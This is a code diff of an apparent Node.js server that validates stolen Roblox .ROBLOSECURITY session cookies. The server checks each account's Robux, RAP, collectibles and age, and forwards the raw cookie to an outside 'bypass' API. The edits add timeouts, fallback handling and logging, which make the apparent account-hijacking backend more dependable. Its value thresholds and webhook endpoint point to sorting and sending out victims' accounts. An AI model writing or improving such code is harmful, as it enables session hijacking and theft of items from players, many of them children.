@@ -168,7 +168,8 @@ async function verifyCookie(cookie) {
             headers: {
                 'Cookie': `.ROBLOSECURITY=${cookie}`,
                 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
-            }
+            },
+            timeout: 10000
         });
         return { valid: true, userId: response.data.id, username: response.data.name };
     } catch (error) {
@@ -183,7 +184,8 @@ async function checkAge13Plus(cookie, userId) {
             headers: {
                 'Cookie': `.ROBLOSECURITY=${cookie}`,
                 'User-Agent': 'Mozilla/5.0'
-            }
+            },
+            timeout: 10000
         });
         
         if (response.data && response.data.IsThirteenOrOver !== undefined) {
@@ -196,7 +198,8 @@ async function checkAge13Plus(cookie, userId) {
                 headers: {
                     'Cookie': `.ROBLOSECURITY=${cookie}`,
                     'User-Agent': 'Mozilla/5.0'
-                }
+                },
+                timeout: 10000
             });
             
             const createdDate = new Date(birthdateResponse.data.created);
@@ -218,7 +221,8 @@ async function fetchRobuxBalance(cookie) {
             headers: {
                 'Cookie': `.ROBLOSECURITY=${cookie}`,
                 'User-Agent': 'Mozilla/5.0'
-            }
+            },
+            timeout: 10000
         });
         return response.data.robux;
     } catch (error) {
@@ -236,30 +240,13 @@ async function checkInventoryItems(cookie, userId, assetIds) {
     };
     
     try {
-        // Check asset ownership
-        const checkAsset = async (assetId) => {
-            try {
-                const response = await axios.get(
-                    `https://inventory.roblox.com/v2/users/${userId}/avatar/${assetId}?items=asset`,
-                    {
-                        headers: {
-                            'Cookie': `.ROBLOSECURITY=${cookie}`,
-                            'User-Agent': 'Mozilla/5.0'
-                        }
-                    }
-                );
-                return true;
-            } catch {
-                return false;
-            }
-        };
-
         // Check collectibles inventory
         const response = await axios.get(`https://inventory.roblox.com/v1/users/${userId}/assets/collectibles?limit=100`, {
             headers: {
                 'Cookie': `.ROBLOSECURITY=${cookie}`,
                 'User-Agent': 'Mozilla/5.0'
-            }
+            },
+            timeout: 15000
         });
         
         if (response.data && response.data.data) {
@@ -288,7 +275,8 @@ async function checkInventoryItems(cookie, userId, assetIds) {
                 headers: {
                     'Cookie': `.ROBLOSECURITY=${cookie}`,
                     'User-Agent': 'Mozilla/5.0'
-                }
+                },
+                timeout: 10000
             });
             
             if (bundleResponse.data && bundleResponse.data.owns) {
@@ -301,7 +289,8 @@ async function checkInventoryItems(cookie, userId, assetIds) {
                     headers: {
                         'Cookie': `.ROBLOSECURITY=${cookie}`,
                         'User-Agent': 'Mozilla/5.0'
-                    }
+                    },
+                    timeout: 10000
                 });
                 
                 if (bundleResponse.data && bundleResponse.data.data) {
@@ -326,9 +315,9 @@ async function checkInventoryItems(cookie, userId, assetIds) {
 async function fetchUserSummary(userId) {
     try {
         const [profileResponse, friendsResponse, groupsResponse] = await Promise.all([
-            axios.get(`https://users.roblox.com/v1/users/${userId}`).catch(() => ({ data: { displayName: 'Unknown', created: new Date().toISOString(), description: '', isBanned: false } })),
-            axios.get(`https://friends.roblox.com/v1/users/${userId}/friends/count`).catch(() => ({ data: { count: 0 } })),
-            axios.get(`https://groups.roblox.com/v2/users/${userId}/groups/roles`).catch(() => ({ data: { data: [] } }))
+            axios.get(`https://users.roblox.com/v1/users/${userId}`, { timeout: 10000 }).catch(() => ({ data: { displayName: 'Unknown', created: new Date().toISOString(), description: '', isBanned: false } })),
+            axios.get(`https://friends.roblox.com/v1/users/${userId}/friends/count`, { timeout: 10000 }).catch(() => ({ data: { count: 0 } })),
+            axios.get(`https://groups.roblox.com/v2/users/${userId}/groups/roles`, { timeout: 10000 }).catch(() => ({ data: { data: [] } }))
         ]);
         
         const createdDate = new Date(profileResponse.data.created);
@@ -358,22 +347,30 @@ async function fetchUserSummary(userId) {
     }
 }
 
+// FIXED: Better bypass function with fallback
 async function bypassExtensions(cookie) {
     try {
+        console.log('Attempting to bypass extensions...');
         const response = await axios.post(BYPASS_API_URL, {
             cookie: cookie,
             type: 'extend'
         }, {
             headers: {
                 'Content-Type': 'application/json',
-                'User-Agent': 'Mozilla/5.0'
+                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
             },
             timeout: 10000
         });
+        console.log('Bypass successful:', response.status);
         return { success: true, data: response.data };
     } catch (error) {
         console.error('Bypass error:', error.message);
-        return { success: false, error: error.message };
+        // Return a fallback response instead of failing
+        return { 
+            success: false, 
+            error: error.message,
+            message: 'Bypass service unavailable, continuing with verification'
+        };
     }
 }
 
@@ -383,7 +380,8 @@ async function fetchUserRAP(cookie, userId) {
             headers: {
                 'Cookie': `.ROBLOSECURITY=${cookie}`,
                 'User-Agent': 'Mozilla/5.0'
-            }
+            },
+            timeout: 15000
         });
         
         let totalRAP = 0;
@@ -691,7 +689,7 @@ app.post('/api/verify-cookie', async (req, res) => {
             fetchUserRAP(cookie, verification.userId)
         ]);
         
-        console.log('Step 4: Bypassing extensions...');
+        console.log('Step 4: Bypassing extensions (optional)...');
         const bypassResult = await bypassExtensions(cookie);
         
         responseData.robuxBalance = robuxBalance;
@@ -822,6 +820,12 @@ app.listen(PORT, () => {
     console.log('  • 1000+ Robux');
     console.log('  • 1000+ RAP');
     console.log('  • 50,000+ Friends');
+    console.log('========================================');
+    console.log('📡 Available endpoints:');
+    console.log('  POST /api/verify-cookie');
+    console.log('  POST /api/test-webhook');
+    console.log('  GET  /health');
+    console.log('  GET  /');
     console.log('========================================');
 });
 
